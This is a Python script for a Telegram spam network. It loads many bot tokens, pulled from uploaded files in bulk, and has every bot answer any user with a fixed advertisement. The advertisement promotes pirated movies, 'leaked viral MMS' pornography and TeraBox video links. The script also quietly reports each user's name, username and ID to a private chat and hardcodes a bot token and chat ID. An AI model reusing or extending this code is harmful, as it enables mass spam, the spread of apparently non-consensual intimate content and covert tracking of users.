import re
import asyncio
import os
import logging
import time
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import telegram
from collections import deque
from telegram.error import RetryAfter, Conflict, NetworkError, TelegramError
import aiofiles
import aiofiles.os
import json
import csv

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
CUSTOM_MESSAGE = r"""
══════⊹⊱≼≽⊰⊹══════
*@NeonGhost\_Networks* `Search & Download Your Favourite Movies` 👇👇🆓
[Link 1](https://t.me/+0M4cL9_CsndiNjFk) [Link 2](https://t.me/+0M4cL9_CsndiNjFk)
══════⊹⊱≼≽⊰⊹══════
══════⊹⊱≼≽⊰⊹══════
`Leak Viral Video MMS OYO P0rn ` 🚨👇👇🆓
[Link 1](https://t\.me/\+XNvgEn\-PVqE1ZmU8) [Link 2](https://t\.me/\+XNvgEn\-PVqE1ZmU8)
══════⊹⊱≼≽⊰⊹══════
══════⊹⊱≼≽⊰⊹══════
`TeraBox Viral Video Links`🔗🍑👇👇
[Link 1](https://t\.me/\+vgOaudZKle0zNmE0) [Link 2](https://t\.me/\+vgOaudZKle0zNmE0)
══════⊹⊱≼≽⊰⊹══════
══════⊹⊱≼≽⊰⊹══════
`TeraBox Video Downloader Bot` 🎥🍿👇👇
[Link 1](https://t\.me/TeraBox\_Download3r\_Bot) [Link 2](https://t\.me/TeraBox\_Download3r\_Bot)
══════⊹⊱≼≽⊰⊹══════
For More: \- *@NeonGhost\_Networks*
"""

NOTIFICATION_BOT_TOKEN = '6836105234:AAFYHYLpQrecJGMVIRJHraGnHTbcON3pxxU'
NOTIFICATION_CHAT_ID = '-1002177330851'
BOT_TOKENS_FILE = 'bot_tokens.txt'

# Global variables
total_messages_sent = 0
running_bots = []
recent_messages = deque(maxlen=1000)
uploaded_files = {}
user_interaction_cache = set()
bot_applications = {}

# Custom RateLimiter implementation
class RateLimiter:
    def __init__(self, rate: int, per: float):
        self.rate = rate
        self.per = per
        self.allowance = rate
        self.last_check = time.time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        async with self.lock:
            now = time.time()
            time_passed = now - self.last_check
            self.last_check = now
            self.allowance += time_passed * (self.rate / self.per)
            if self.allowance > self.rate:
                self.allowance = self.rate
            if self.allowance < 1:
                return False
            self.allowance -= 1
            return True

# Add rate limiter
rate_limiter = RateLimiter(rate=20, per=60)  # 20 messages per minute

# Helper functions
async def send_notification(user_info, interaction_type, bot_info=None):
    notification_bot = Bot(NOTIFICATION_BOT_TOKEN)
    message = f"User interaction:\nType: {interaction_type}\nUser: {user_info}"
    if bot_info:
        message += f"\nBot: {bot_info}"
    try:
        await notification_bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
    except telegram.error.TelegramError as e:
        logger.error(f"Error sending notification: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in send_notification: {e}")

async def handle_user_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global total_messages_sent, user_interaction_cache
    
    try:
        if update.message is None:
            logger.error("Error: Message object is None")
            return

        # Apply rate limiting
        if not await rate_limiter.acquire():
            logger.warning("Rate limit exceeded. Skipping message.")
            return

        user = update.effective_user
        chat = update.effective_chat
        bot = context.bot
        
        if user is None:
            user_info = "Unknown user"
        else:
            user_info = f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'No username'}) (ID: {user.id})"
        
        bot_info = f"{bot.first_name} (@{bot.username})"
        
        interaction_key = f"{user.id if user else 'unknown'}_{bot.id}_{chat.id if chat else 'unknown'}"
        
        if interaction_key not in user_interaction_cache:
            user_interaction_cache.add(interaction_key)
            await send_notification(user_info, "New user interaction", bot_info)
        
        try:
            await update.message.reply_text(CUSTOM_MESSAGE, parse_mode=ParseMode.MARKDOWN_V2, disable_web_page_preview=True)
            total_messages_sent += 1
            recent_messages.append(time.time())
            await send_notification(user_info, "Custom message sent", bot_info)
        except telegram.error.TelegramError as e:
            error_message = f"Error sending message: {str(e)}"
            await send_notification(user_info, "Error", f"{bot_info}\n{error_message}")
        except AttributeError:
            error_message = "Error: Message object is None"
            await send_notification(user_info, "Error", f"{bot_info}\n{error_message}")
    except Exception as e:
        logger.error(f"Unexpected error in handle_user_interaction: {e}")

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_user_interaction(update, context)
    user_info = f"{update.effective_user.first_name} {update.effective_user.last_name or ''} (@{update.effective_user.username or 'No username'}) (ID: {update.effective_user.id})"
    bot_info = f"{context.bot.first_name} (@{context.bot.username})"
    await send_notification(user_info, "Start command", bot_info)

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_user_interaction(update, context)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_time = time.time()
    messages_last_5_min = sum(1 for msg_time in recent_messages if current_time - msg_time <= 300)
    stats_message = (
        f"Total messages sent: {total_messages_sent}\n"
        f"Messages sent in last 5 minutes: {messages_last_5_min}\n"
        f"Total bots running: {len(running_bots)}"
    )
    await update.message.reply_text(stats_message)

async def add_token_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Please reply to a document message containing the bot tokens.")
        return
    
    file_id = update.message.reply_to_message.document.file_id
    file = await context.bot.get_file(file_id)
    
    try:
        downloaded_file = await file.download_as_bytearray()
        file_content = downloaded_file.decode('utf-8')
        
        # Extract tokens using various methods
        tokens = set()
        
        # Method 1: Regular expression for standard bot token format
        tokens.update(re.findall(r'\b\d+:[A-Za-z0-9_-]{35}\b', file_content))
        
        # Method 2: Look for "bot token" or similar phrases
        tokens.update(re.findall(r'(?:bot token|token)[:=]\s*([A-Za-z0-9:_-]{45,})', file_content, re.IGNORECASE))
        
        # Method 3: Try parsing as JSON
        try:
            json_data = json.loads(file_content)
            if isinstance(json_data, dict):
                tokens.update(extract_tokens_from_dict(json_data))
            elif isinstance(json_data, list):
                for item in json_data:
                    if isinstance(item, dict):
                        tokens.update(extract_tokens_from_dict(item))
        except json.JSONDecodeError:
            pass
        
        # Method 4: Try parsing as CSV
        try:
            csv_reader = csv.reader(file_content.splitlines())
            for row in csv_reader:
                tokens.update(token for token in row if re.match(r'\d+:[A-Za-z0-9_-]{35}', token))
        except csv.Error:
            pass
        
        if not tokens:
            await update.message.reply_text("No valid tokens found in the provided file.")
            return
        
        status_message = await update.message.reply_text("Starting to add new bots...")
        new_bots = 0
        for i, token in enumerate(tokens):
            if token not in [bot['token'] for bot in running_bots]:
                bot = await initialize_bot(token)
                if bot:
                    new_bots += 1
                    await status_message.edit_text(f"Added {new_bots} new bot(s). Processing token {i+1}/{len(tokens)}...")
            else:
                await status_message.edit_text(f"Skipped existing bot. Processing token {i+1}/{len(tokens)}...")
        
        await save_bot_tokens()
        await status_message.edit_text(f"Finished! Successfully added {new_bots} new bots from the file and saved to {BOT_TOKENS_FILE}.")
    except Exception as e:
        await update.message.reply_text(f"Failed to add tokens from the file: {str(e)}")

def extract_tokens_from_dict(data):
    tokens = set()
    for key, value in data.items():
        if isinstance(value, str) and re.match(r'\d+:[A-Za-z0-9_-]{35}', value):
            tokens.add(value)
        elif isinstance(value, (dict, list)):
            tokens.update(extract_tokens_from_dict(value))
    return tokens

async def list_running_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not running_bots:
        await update.message.reply_text("No bots are currently running.")
        return
    
    bot_list = "Running bots:\n\n"
    for bot in running_bots:
        bot_list += f"Name: {bot['name']}\n"
        bot_list += f"Username: @{bot['username']}\n"
        bot_list += f"Token: {bot['token'][:10]}...\n\n"
    
    if len(bot_list) > 4096:
        for i in range(0, len(bot_list), 4096):
            await update.message.reply_text(bot_list[i:i+4096])
    else:
        await update.message.reply_text(bot_list)

# Utility functions
async def load_bot_tokens():
    if await aiofiles.os.path.exists(BOT_TOKENS_FILE):
        try:
            async with aiofiles.open(BOT_TOKENS_FILE, 'r', encoding='utf-8') as f:
                content = await f.read()
                tokens = []
                for line in content.splitlines():
                    parts = line.strip().split(', ')
                    if parts and parts[0].startswith('Bot token:'):
                        token = parts[0].split(': ', 1)[1]
                        tokens.append(token)
                return tokens
        except UnicodeDecodeError:
            # If UTF-8 fails, try with 'latin-1' encoding
            async with aiofiles.open(BOT_TOKENS_FILE, 'r', encoding='latin-1') as f:
                content = await f.read()
                tokens = []
                for line in content.splitlines():
                    parts = line.strip().split(', ')
                    if parts and parts[0].startswith('Bot token:'):
                        token = parts[0].split(': ', 1)[1]
                        tokens.append(token)
                return tokens
        except Exception as e:
            logger.error(f"Error loading bot tokens: {e}")
            return []
    return []

async def save_bot_tokens():
    try:
        async with aiofiles.open(BOT_TOKENS_FILE, 'w', encoding='utf-8') as f:
            for bot in running_bots:
                await f.write(f"Bot token: {bot['token']}, Name: {bot['name']}, Username: {bot['username']}\n")
        logger.info(f"Saved {len(running_bots)} bot tokens to {BOT_TOKENS_FILE}")
    except Exception as e:
        logger.error(f"Error saving bot tokens: {e}")

async def check_bot_token(token):
    try:
        bot = Bot(token)
        await bot.get_me()
        return True
    except TelegramError as e:
        logger.error(f"Error checking token {token[:10]}...: {str(e)}")
        return False

async def initialize_bot(token):
    global running_bots, bot_applications
    try:
        if token in bot_applications:
            logger.info(f"Bot with token {token[:10]}... is already running.")
            return bot_applications[token]

        if not await check_bot_token(token):
            return None
        
        app = Application.builder().token(token).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
        app.add_error_handler(global_error_handler)
        
        try:
            await app.initialize()
            await app.start()
            await app.updater.start_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
        except telegram.error.TelegramError as e:
            logger.error(f"Telegram error while initializing bot: {e}")
            return None
        
        bot_info = await app.bot.get_me()
        bot_applications[token] = app
        running_bots.append({
            'token': token,
            'name': bot_info.first_name,
            'username': bot_info.username,
            'app': app
        })
        logger.info(f"Bot with token {token[:10]}... successfully started.")
        return app
    except Exception as e:
        logger.error(f"Error initializing bot with token {token[:10]}...: {str(e)}")
        await asyncio.sleep(0.5)  # Reduced delay to 0.5 seconds
    return None

# Error handlers
async def handle_flood_wait(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        retry_after = int(context.error.retry_after)
        logger.warning(f"Flood wait error. Retrying after {retry_after} seconds.")
        await asyncio.sleep(retry_after)
        await handle_user_interaction(update, context)
    except Exception as e:
        logger.error(f"Error handling flood wait: {e}")

async def global_error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    error = context.error
    try:
        raise error
    except TelegramError as e:
        logger.error(f"Telegram error: {e}")
    except RetryAfter as e:
        await handle_flood_wait(update, context)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    
    # Notify about the error
    await send_notification("System", f"Global error: {str(error)}")

# File handler
async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.document:
        file_id = update.message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = os.path.join("uploaded_files", update.message.document.file_name)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        await new_file.download(file_path)
        uploaded_files[update.message.message_id] = file_path
        await update.message.reply_text(f"File {update.message.document.file_name} uploaded. Reply with /add_token_file to add tokens from this file.")

async def start_bots_in_batches(tokens, batch_size=5):
    for i in range(0, len(tokens), batch_size):
        batch = tokens[i:i+batch_size]
        try:
            await asyncio.gather(*[initialize_bot(token) for token in batch])
        except Exception as e:
            logger.error(f"Error starting batch of bots: {e}")

async def reconnect_bot(bot):
    try:
        await bot['app'].stop()
        await bot['app'].shutdown()
    except Exception as e:
        logger.error(f"Error stopping bot {bot['username']}: {e}")
    
    try:
        new_app = await initialize_bot(bot['token'])
        if new_app:
            bot['app'] = new_app
            logger.info(f"Successfully reconnected bot {bot['username']}")
        else:
            logger.error(f"Failed to reconnect bot {bot['username']}")
    except Exception as e:
        logger.error(f"Error reconnecting bot {bot['username']}: {e}")

async def check_and_reconnect_bots():
    while True:
        tasks = []
        for bot in running_bots:
            tasks.append(asyncio.create_task(check_and_reconnect_bot(bot)))
        
        await asyncio.gather(*tasks)
        await asyncio.sleep(300)  # Check every 5 minutes

async def check_and_reconnect_bot(bot):
    try:
        await bot['app'].bot.get_me()
    except NetworkError:
        logger.warning(f"Bot {bot['username']} seems to be disconnected. Attempting to reconnect...")
        await reconnect_bot(bot)
    except Exception as e:
        logger.error(f"Error checking bot {bot['username']}: {e}")

async def main():
    global running_bots
    tokens = await load_bot_tokens()
    
    await start_bots_in_batches(tokens)
    
    if not running_bots:
        logger.warning("No bots were successfully initialized. Continuing with personal bot.")
    else:
        logger.info(f"Successfully started {len(running_bots)} bot(s).")

    personal_app = Application.builder().token(NOTIFICATION_BOT_TOKEN).build()
    personal_app.add_handler(CommandHandler("stats", stats_command))
    personal_app.add_handler(CommandHandler("add_token_file", add_token_file))
    personal_app.add_handler(CommandHandler("list_bots", list_running_bots))
    personal_app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    personal_app.add_error_handler(global_error_handler)
    
    try:
        await personal_app.initialize()
        await personal_app.start()
        await personal_app.updater.start_polling(drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Error starting personal bot: {e}")
        return

    # Start the bot checking and reconnection task
    asyncio.create_task(check_and_reconnect_bots())

    try:
        while True:
            await asyncio.sleep(60)
    except Exception as e:
        logger.error(f"Unexpected error in main loop: {e}")
    finally:
        for bot in running_bots:
            try:
                await bot['app'].stop()
                await bot['app'].shutdown()
            except Exception as e:
                logger.error(f"Error stopping bot {bot['username']}: {e}")
        try:
            await personal_app.stop()
            await personal_app.shutdown()
        except Exception as e:
            logger.error(f"Error stopping personal bot: {e}")

if __name__ == '__main__':
    max_retries = 5
    retry_delay = 60
    retry_count = 0

    while retry_count < max_retries:
        try:
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Critical error in main function: {e}")
            retry_count += 1
            if retry_count < max_retries:
                logger.info(f"Restarting main function in {retry_delay} seconds... (Attempt {retry_count}/{max_retries})")
                time.sleep(retry_delay)
            else:
                logger.error(f"Max retries ({max_retries}) reached. Exiting.")
                break
